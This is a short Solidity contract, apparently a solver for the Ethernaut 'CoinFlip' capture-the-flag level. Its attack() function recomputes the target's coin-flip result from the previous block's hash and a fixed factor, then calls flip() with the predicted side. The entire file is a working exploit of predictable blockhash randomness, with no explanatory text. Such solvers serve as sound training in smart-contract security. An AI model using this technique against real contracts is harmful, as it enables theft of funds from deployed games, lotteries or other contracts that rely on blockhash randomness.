// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool) external returns(bool);
}
contract CoinFlipSolver {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public game;

    constructor(address _instance) {
        game = ICoinFlip(_instance);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = (blockValue/FACTOR) == 1;
        game.flip(side);
    }
}
